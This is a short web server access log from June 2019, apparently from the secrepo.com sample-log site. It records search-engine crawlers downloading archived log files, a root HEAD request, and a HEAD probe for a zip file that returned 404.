216.244.66.245 - - [26/Jun/2019:12:11:13 -0700] "GET /self.logs/2015/access.log.2015-06-27.gz HTTP/1.1" 200 5475 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:14 -0700] "GET /self.logs/2015/access.log.2015-09-07.gz HTTP/1.1" 200 3995 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:15 -0700] "GET /self.logs/2015/error.log.2015-03-11.gz HTTP/1.1" 200 639 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:16 -0700] "GET /self.logs/2015/error.log.2015-03-31.gz HTTP/1.1" 200 1128 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:17 -0700] "GET /self.logs/2015/error.log.2015-10-04.gz HTTP/1.1" 200 882 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:18 -0700] "GET /self.logs/2016/access.log.2016-02-20.gz HTTP/1.1" 200 10032 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:19 -0700] "GET /self.logs/2016/access.log.2016-05-11.gz HTTP/1.1" 200 18281 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:20 -0700] "GET /self.logs/2016/access.log.2016-07-15.gz HTTP/1.1" 200 12107 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:21 -0700] "GET /self.logs/2016/access.log.2016-07-24.gz HTTP/1.1" 200 6294 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:23 -0700] "GET /self.logs/2016/access.log.2016-08-12.gz HTTP/1.1" 200 16413 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:24 -0700] "GET /self.logs/2016/access.log.2016-08-21.gz HTTP/1.1" 200 7730 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:25 -0700] "GET /self.logs/2016/error.log.2016-04-11.gz HTTP/1.1" 200 898 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:26 -0700] "GET /self.logs/2016/error.log.2016-08-18.gz HTTP/1.1" 200 553 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:27 -0700] "GET /self.logs/2016/error.log.2016-11-09.gz HTTP/1.1" 200 621 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [26/Jun/2019:12:11:28 -0700] "GET /self.logs/2016/error.log.2016-11-22.gz HTTP/1.1" 200 1269 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.150.166 - - [26/Jun/2019:12:11:56 -0700] "GET /self.logs/error.log.2015-10-18.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.22 - - [26/Jun/2019:12:12:03 -0700] "GET /self.logs/error.log.2016-11-26.gz HTTP/1.1" 404 250 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
218.92.226.178 - - [26/Jun/2019:12:20:38 -0700] "HEAD / HTTP/1.1" 200 317 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36" 
115.200.211.182 - - [26/Jun/2019:12:20:39 -0700] "HEAD //1.zip HTTP/1.1" 404 231 "http://www.secrepo.com//1.zip" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" 
